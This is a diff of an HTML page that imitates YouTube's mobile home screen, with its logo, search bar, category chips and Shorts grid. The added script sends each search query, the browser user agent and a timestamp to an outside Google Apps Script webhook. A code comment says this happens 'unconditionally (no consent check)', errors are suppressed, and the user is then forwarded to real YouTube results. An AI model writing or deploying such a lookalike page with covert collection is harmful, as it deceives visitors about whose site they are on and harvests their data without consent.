@@ -1,270 +1,467 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>YouTube</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>YouTube</title>
 
-<style>
-  :root{
-    --ytRed:#ff0000;
-    --border:#e6e6e6;
-    --chip:#f2f2f2;
-    --text:#0f0f0f;
-    --muted:#606060;
-  }
-  *{box-sizing:border-box}
-  body{
-    margin:0;
-    font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
-    background:#fff;
-    color:var(--text);
-  }
+  <style>
+    :root{
+      --bg:#fff;
+      --text:#0f0f0f;
+      --muted:#606060;
+      --chip:#f2f2f2;
+      --chipActive:#0f0f0f;
+      --chipActiveText:#fff;
+      --border:#e6e6e6;
+      --shadow: 0 1px 10px rgba(0,0,0,.08);
+      --radius:16px;
+      --max: 760px;
+      --ytRed:#ff0000;
+    }
 
-  /* ===== TOP ===== */
-  .top{
-    position:sticky;
-    top:0;
-    background:#fff;
-    border-bottom:1px solid var(--border);
-    z-index:10;
-  }
-  .topRow{
-    display:flex;
-    align-items:center;
-    gap:12px;
-    padding:10px 12px;
-  }
-  .brand img{
-    height:34px; /* bigger logo */
-  }
-  .searchWrap{flex:1;}
-  .searchBar{
-    background:#f6f6f6;
-    border-radius:999px;
-    padding:10px 14px;
-  }
-  .searchBar input{
-    width:100%;
-    border:0;
-    outline:none;
-    font-size:15px;
-    background:transparent;
-  }
+    *{ box-sizing:border-box; }
+    body{
+      margin:0;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+      background:var(--bg);
+      color:var(--text);
+    }
 
-  /* ===== CHIPS ===== */
-  .chipsRow{
-    display:flex;
-    gap:10px;
-    padding:10px 12px;
-    overflow-x:auto;
-    -webkit-overflow-scrolling:touch;
-  }
-  .chip{
-    padding:8px 14px;
-    border-radius:999px;
-    background:var(--chip);
-    font-size:13px;
-    white-space:nowrap;
-  }
-  .chip.active{
-    background:#000;
-    color:#fff;
-  }
+    .page{
+      max-width: var(--max);
+      margin: 0 auto;
+      padding: 10px 12px 28px;
+    }
 
-  /* ===== PAGE ===== */
-  .page{
-    max-width:900px;
-    margin:auto;
-    padding:10px 12px 22px;
-  }
+    /* Header */
+    .topbar{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      padding: 6px 0 10px;
+    }
 
-  /* ===== MAIN VIDEO ===== */
-  .mainThumb{
-    width:100%;
-    border-radius:14px;
-    overflow:hidden;
-    position:relative;
-    background:#eee;
-  }
-  .mainThumb img{
-    width:100%;
-    display:block;
-    height:auto;
-  }
-  .duration{
-    position:absolute;
-    right:10px;
-    bottom:10px;
-    background:rgba(0,0,0,.75);
-    color:#fff;
-    font-size:12px;
-    padding:4px 6px;
-    border-radius:6px;
-  }
-  .meta{
-    display:flex;
-    gap:10px;
-    margin-top:10px;
-    align-items:flex-start;
-  }
-  .avatar{
-    width:36px;
-    height:36px;
-    border-radius:50%;
-    background:#ddd;
-    flex:0 0 auto;
-  }
-  .title{
-    font-weight:600;
-    line-height:1.25;
-  }
-  .sub{
-    font-size:12px;
-    color:var(--muted);
-    margin-top:4px;
-  }
+    .yt-logo{
+      height: 32px; /* bigger */
+      width:auto;
+      object-fit:contain;
+      user-select:none;
+    }
 
-  /* ===== SHORTS ===== */
-  .shortsHeader{
-    display:flex;
-    align-items:center;
-    gap:8px;
-    margin:18px 0 10px;
-    font-weight:700;
-    font-size:18px;
-  }
-  .shortsHeader .red{
-    color:var(--ytRed);
-    font-size:20px;
-    line-height:1;
-  }
-  .shortsGrid{
-    display:grid;
-    grid-template-columns:repeat(2,1fr);
-    gap:10px;
-  }
-  .short{
-    position:relative;
-    border-radius:14px;
-    overflow:hidden;
-    aspect-ratio:9/16;
-    background:#eee;
-  }
-  .short img{
-    width:100%;
-    height:100%;
-    object-fit:cover;
-    display:block;
-  }
-  .views{
-    position:absolute;
-    top:8px;
-    left:8px;
-    background:rgba(0,0,0,.6);
-    color:#fff;
-    font-size:12px;
-    padding:4px 8px;
-    border-radius:999px;
-  }
+    .searchWrap{
+      flex:1;
+      display:flex;
+      align-items:center;
+      gap:8px;              /* space between box and button */
+      position:relative;
+      min-width:0;
+    }
 
-  @media(min-width:820px){
-    .shortsGrid{grid-template-columns:repeat(3,1fr)}
-  }
-</style>
+    .searchBar{
+      flex:1;
+      width:100%;
+      display:flex;
+      align-items:center;
+      background:#f6f6f6;
+      border: 1px solid #efefef;
+      border-radius: 999px;
+      padding: 10px 12px;
+      min-width:0;
+    }
+
+    .searchInput{
+      border:0;
+      outline:none;
+      background:transparent;
+      width:100%;
+      font-size:16px;
+      color:var(--text);
+      min-width:0;
+    }
+
+    /* clickable search button right after box */
+    .searchBtn{
+      border: 1px solid #efefef;
+      background:#f6f6f6;
+      width:42px;
+      height:42px;
+      border-radius: 999px;
+      display:grid;
+      place-items:center;
+      cursor:pointer;
+      flex: 0 0 auto;
+    }
+    .searchBtn:active{ transform: scale(.98); }
+
+    .magnify{
+      width:22px;
+      height:22px;
+      opacity:.85;
+    }
+
+    /* Suggestions dropdown */
+    .suggestBox{
+      position:absolute;
+      top: calc(100% + 8px);
+      left:0;
+      right:52px; /* leave space so it doesn't go under the button */
+      background:#fff;
+      border:1px solid var(--border);
+      border-radius: 14px;
+      box-shadow: var(--shadow);
+      overflow:hidden;
+      display:none;
+      z-index:20;
+    }
+    .suggestRow{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      padding: 10px 12px;
+      cursor:pointer;
+    }
+    .suggestRow:hover{ background:#fafafa; }
+    .sIcon{
+      width:18px;
+      height:18px;
+      opacity:.7;
+      flex:0 0 auto;
+    }
+    .suggestText{
+      font-size:14px;
+      color:#111;
+      white-space:nowrap;
+      overflow:hidden;
+      text-overflow:ellipsis;
+    }
+
+    /* Chips */
+    .chips{
+      display:flex;
+      gap:10px;
+      overflow:auto;
+      padding: 8px 0 8px;
+      -webkit-overflow-scrolling: touch;
+    }
+    .chip{
+      border:0;
+      padding: 10px 14px;
+      border-radius: 999px;
+      background: var(--chip);
+      color:#111;
+      font-size:14px;
+      cursor:pointer;
+      white-space:nowrap;
+    }
+    .chip.active{
+      background: var(--chipActive);
+      color: var(--chipActiveText);
+    }
+
+    /* Featured video */
+    .card{
+      margin-top: 10px;
+      border-radius: var(--radius);
+      overflow:hidden;
+      background:#fff;
+    }
+    .thumb{
+      width:100%;
+      aspect-ratio: 16 / 9;
+      object-fit: cover;
+      display:block;
+      background:#eee;
+    }
+    .meta{
+      display:flex;
+      gap:10px;
+      padding: 10px 0 4px;
+      align-items:flex-start;
+    }
+    .avatar{
+      width:36px; height:36px;
+      border-radius:999px;
+      background: radial-gradient(circle at 30% 30%, #ddd, #bbb);
+      flex:0 0 auto;
+    }
+    .title{
+      font-size:15px;
+      font-weight:650;
+      margin:0;
+      line-height:1.25;
+    }
+    .sub{
+      margin-top:4px;
+      font-size:12.5px;
+      color: var(--muted);
+    }
+
+    /* Shorts */
+    .shortsHeader{
+      display:flex;
+      align-items:center;
+      gap:8px;
+      margin: 14px 0 10px;
+    }
+    .shortsIcon{
+      width:18px; height:18px;
+      flex:0 0 auto;
+    }
+    .shortsHeader h3{
+      margin:0;
+      font-size:18px;
+      letter-spacing:.1px;
+    }
+
+    .shortsGrid{
+      display:grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+    }
+    @media (min-width: 520px){
+      .shortsGrid{ grid-template-columns: repeat(3, 1fr); }
+    }
+
+    .short{
+      position:relative;
+      border-radius: 14px;
+      overflow:hidden;
+      background:#eee;
+      display:block;
+      text-decoration:none;
+      color:inherit;
+    }
+    .short img{
+      width:100%;
+      aspect-ratio: 9 / 16;
+      object-fit: cover;
+      display:block;
+    }
+    .badge{
+      position:absolute;
+      top:8px;
+      left:8px;
+      background: rgba(0,0,0,.55);
+      color:#fff;
+      font-size:12px;
+      padding: 4px 8px;
+      border-radius: 999px;
+      backdrop-filter: blur(3px);
+    }
+    .shortCaption{
+      position:absolute;
+      left:10px;
+      right:10px;
+      bottom:10px;
+      color:#fff;
+      font-size:12.5px;
+      line-height:1.2;
+      text-shadow: 0 2px 10px rgba(0,0,0,.55);
+      display:-webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow:hidden;
+    }
+  </style>
 </head>
 
 <body>
+  <div class="page">
+    <div class="topbar">
+      <img src="youtube-logo.png" class="yt-logo" alt="YouTube" />
 
-<div class="top">
-  <div class="topRow">
-    <div class="brand">
-      <!-- your repo file -->
-      <img src="youtube-logo.png" alt="YouTube">
-    </div>
+      <div class="searchWrap">
+        <form id="searchForm" class="searchBar" autocomplete="off">
+          <input id="q" class="searchInput" type="text" placeholder="Search YouTube" aria-label="Search YouTube" />
+        </form>
 
-    <div class="searchWrap">
-      <div class="searchBar">
-        <input id="q" type="text" placeholder="Search YouTube" autocomplete="off">
+        <!-- clickable search icon right after box -->
+        <button id="searchBtn" class="searchBtn" type="button" aria-label="Search">
+          <svg class="magnify" viewBox="0 0 24 24" aria-hidden="true">
+            <path fill="currentColor" d="M10 18a8 8 0 1 1 5.29-14A8 8 0 0 1 10 18Zm11.71 2.29-5.4-5.4a10 10 0 1 0-1.41 1.41l5.4 5.4a1 1 0 0 0 1.41-1.41Z"/>
+          </svg>
+        </button>
+
+        <div id="suggestBox" class="suggestBox" role="listbox" aria-label="Suggestions"></div>
       </div>
     </div>
+
+    <div class="chips" id="chips">
+      <button class="chip active" type="button">All</button>
+      <button class="chip" type="button">Inventions</button>
+      <button class="chip" type="button">Music</button>
+      <button class="chip" type="button">Eggs</button>
+      <button class="chip" type="button">Cooking</button>
+      <button class="chip" type="button">Science</button>
+      <button class="chip" type="button">Sports</button>
+    </div>
+
+    <!-- Featured video (Picsum = reliable) -->
+    <section class="card">
+      <a href="https://www.youtube.com/" target="_blank" rel="noreferrer">
+        <img class="thumb"
+             src="https://picsum.photos/seed/foodplate/1400/788"
+             alt="Featured video thumbnail"
+             referrerpolicy="no-referrer" />
+      </a>
+      <div class="meta">
+        <div class="avatar" aria-hidden="true"></div>
+        <div>
+          <p class="title">Quick recipe you can try today (simple & tasty)</p>
+          <div class="sub">Food & Kitchen • 552K views • 2 months ago</div>
+        </div>
+      </div>
+    </section>
+
+    <div class="shortsHeader">
+      <svg class="shortsIcon" viewBox="0 0 24 24" aria-hidden="true">
+        <path fill="#ff0033" d="M14.7 3.6c-1.2.7-2.5 1.4-3.7 2.1-1.5.9-3 1.7-4.5 2.6C5.6 8.8 5 9.7 5 10.8v2.4c0 1.1.6 2 1.5 2.5l6.5 3.8c.9.5 2 .5 2.9 0l2.6-1.5c.9-.5 1.5-1.4 1.5-2.5v-2.4c0-1.1-.6-2-1.5-2.5l-.7-.4.7-.4c.9-.5 1.5-1.4 1.5-2.5V5.1c0-1.8-2-2.9-3.5-1.5l-.1.1c-.6.4-1.2.8-1.8 1.1z"/>
+      </svg>
+      <h3>Shorts</h3>
+    </div>
+
+    <!-- 6 shorts = 3 rows (2 columns) on mobile -->
+    <section class="shortsGrid">
+      <a class="short" href="https://www.youtube.com/shorts/" target="_blank" rel="noreferrer">
+        <img src="https://picsum.photos/seed/travel1/900/1600" alt="Short 1" referrerpolicy="no-referrer">
+        <div class="badge">1.2M</div>
+        <div class="shortCaption">Weekend travel idea</div>
+      </a>
+
+      <a class="short" href="https://www.youtube.com/shorts/" target="_blank" rel="noreferrer">
+        <img src="https://picsum.photos/seed/tech2/900/1600" alt="Short 2" referrerpolicy="no-referrer">
+        <div class="badge">980K</div>
+        <div class="shortCaption">Phone setting you should try</div>
+      </a>
+
+      <a class="short" href="https://www.youtube.com/shorts/" target="_blank" rel="noreferrer">
+        <img src="https://picsum.photos/seed/food3/900/1600" alt="Short 3" referrerpolicy="no-referrer">
+        <div class="badge">640K</div>
+        <div class="shortCaption">Easy breakfast idea</div>
+      </a>
+
+      <a class="short" href="https://www.youtube.com/shorts/" target="_blank" rel="noreferrer">
+        <img src="https://picsum.photos/seed/gadget4/900/1600" alt="Short 4" referrerpolicy="no-referrer">
+        <div class="badge">1.6M</div>
+        <div class="shortCaption">Cool gadget find</div>
+      </a>
+
+      <a class="short" href="https://www.youtube.com/shorts/" target="_blank" rel="noreferrer">
+        <img src="https://picsum.photos/seed/nature5/900/1600" alt="Short 5" referrerpolicy="no-referrer">
+        <div class="badge">410K</div>
+        <div class="shortCaption">Nature clip in 20 seconds</div>
+      </a>
+
+      <a class="short" href="https://www.youtube.com/shorts/" target="_blank" rel="noreferrer">
+        <img src="https://picsum.photos/seed/cooking6/900/1600" alt="Short 6" referrerpolicy="no-referrer">
+        <div class="badge">720K</div>
+        <div class="shortCaption">Quick cooking tip</div>
+      </a>
+    </section>
   </div>
 
-  <div class="chipsRow">
-    <div class="chip active">All</div>
-    <div class="chip">Inventions</div>
-    <div class="chip">Music</div>
-    <div class="chip">Eggs</div>
-    <div class="chip">Cooking</div>
-  </div>
-</div>
+  <script>
+    const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbyOzTC8LwH93cRbya-lJaopRKTr8YibMSQMjsC_i6v5rrq9JfMI_S1pCPfx_lx4M1-k/exec";
 
-<main class="page">
+    const qEl = document.getElementById("q");
+    const form = document.getElementById("searchForm");
+    const searchBtn = document.getElementById("searchBtn");
+    const suggestBox = document.getElementById("suggestBox");
 
-  <!-- Main landscape thumbnail -->
-  <div class="mainThumb">
-    <!-- Online thumbnail (safe topic: food) -->
-    <img
-      src="https://images.unsplash.com/photo-1540189549336-e6e99c3679fe?auto=format&fit=crop&w=1400&q=70"
-      alt="Main video"
-      referrerpolicy="no-referrer"
-    />
-    <div class="duration">3:13</div>
-  </div>
+    // Chips active UI
+    document.getElementById("chips").addEventListener("click", (e) => {
+      if (!e.target.classList.contains("chip")) return;
+      document.querySelectorAll(".chip").forEach(c => c.classList.remove("active"));
+      e.target.classList.add("active");
+    });
 
-  <div class="meta">
-    <div class="avatar"></div>
-    <div>
-      <div class="title">This is tastier and easier than pizza! A quick recipe in 5 minutes</div>
-      <div class="sub">Leicht & lecker · 552K views · 2 months ago</div>
-    </div>
-  </div>
+    // Suggestions (show ONLY when typing starts)
+    const SUGGESTIONS = [
+      "easy breakfast ideas",
+      "quick pasta recipe",
+      "abu dhabi travel places",
+      "how to improve wifi speed",
+      "phone camera settings",
+      "simple home workout",
+      "best budget gadgets",
+      "google sheets tips",
+      "football highlights",
+      "science experiments at home"
+    ];
 
-  <!-- Shorts -->
-  <div class="shortsHeader">
-    <span class="red">▶</span> Shorts
-  </div>
+    function hideSuggestions(){
+      suggestBox.style.display = "none";
+      suggestBox.innerHTML = "";
+    }
 
-  <div class="shortsGrid">
-    <!-- Online “shorts” thumbnails (safe topics: travel/food/tech/lifestyle) -->
-    <div class="short">
-      <img src="https://images.unsplash.com/photo-1520975693411-b4c6a4a6c493?auto=format&fit=crop&w=900&q=70" alt="" referrerpolicy="no-referrer">
-      <div class="views">1.2M</div>
-    </div>
-    <div class="short">
-      <img src="https://images.unsplash.com/photo-1520975958221-63233c33ad5b?auto=format&fit=crop&w=900&q=70" alt="" referrerpolicy="no-referrer">
-      <div class="views">980K</div>
-    </div>
-    <div class="short">
-      <img src="https://images.unsplash.com/photo-1498050108023-c5249f4df085?auto=format&fit=crop&w=900&q=70" alt="" referrerpolicy="no-referrer">
-      <div class="views">640K</div>
-    </div>
-    <div class="short">
-      <img src="https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?auto=format&fit=crop&w=900&q=70" alt="" referrerpolicy="no-referrer">
-      <div class="views">2.1M</div>
-    </div>
-    <div class="short">
-      <img src="https://images.unsplash.com/photo-1490645935967-10de6ba17061?auto=format&fit=crop&w=900&q=70" alt="" referrerpolicy="no-referrer">
-      <div class="views">410K</div>
-    </div>
-    <div class="short">
-      <img src="https://images.unsplash.com/photo-1520975591871-03b1b7d5b4d2?auto=format&fit=crop&w=900&q=70" alt="" referrerpolicy="no-referrer">
-      <div class="views">770K</div>
-    </div>
-  </div>
+    function renderSuggestions(list){
+      if (!list.length) { hideSuggestions(); return; }
+      suggestBox.innerHTML = "";
+      list.slice(0,6).forEach(text => {
+        const row = document.createElement("div");
+        row.className = "suggestRow";
+        row.innerHTML = `
+          <svg class="sIcon" viewBox="0 0 24 24" aria-hidden="true">
+            <path fill="currentColor" d="M10 18a8 8 0 1 1 5.29-14A8 8 0 0 1 10 18Zm11.71 2.29-5.4-5.4a10 10 0 1 0-1.41 1.41l5.4 5.4a1 1 0 0 0 1.41-1.41Z"/>
+          </svg>
+          <div class="suggestText"></div>
+        `;
+        row.querySelector(".suggestText").textContent = text;
+        row.addEventListener("click", () => {
+          qEl.value = text;
+          hideSuggestions();
+          qEl.focus();
+        });
+        suggestBox.appendChild(row);
+      });
+      suggestBox.style.display = "block";
+    }
 
-</main>
+    qEl.addEventListener("input", () => {
+      const v = qEl.value.trim().toLowerCase();
+      if (!v) { hideSuggestions(); return; }
+      const matches = SUGGESTIONS.filter(s => s.toLowerCase().includes(v));
+      renderSuggestions(matches);
+    });
 
-<script>
-  // Optional: press Enter to search YouTube
-  document.getElementById("q").addEventListener("keydown", (e) => {
-    if (e.key === "Enter") {
-      const q = e.target.value.trim();
+    document.addEventListener("click", (e) => {
+      if (e.target === qEl || suggestBox.contains(e.target)) return;
+      hideSuggestions();
+    });
+
+    function submitSearch(){
+      const q = qEl.value.trim();
       if (!q) return;
+
+      // Send search query to webhook unconditionally (no consent check)
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: new URLSearchParams({
+          q: q,
+          ua: navigator.userAgent,
+          src: "yt-demo",
+          timestamp: new Date().toISOString()
+        })
+      }).catch(() => {
+        // Silently ignore errors - webhook failure shouldn't prevent search
+      });
+
+      // Redirect to YouTube search
       window.location.href = "https://www.youtube.com/results?search_query=" + encodeURIComponent(q);
     }
-  });
-</script>
 
+    // Enter key submit
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      submitSearch();
+    });
+
+    // Clickable search icon button
+    searchBtn.addEventListener("click", submitSearch);
+
+    setTimeout(() => qEl.focus(), 250);
+  </script>
 </body>
 </html>
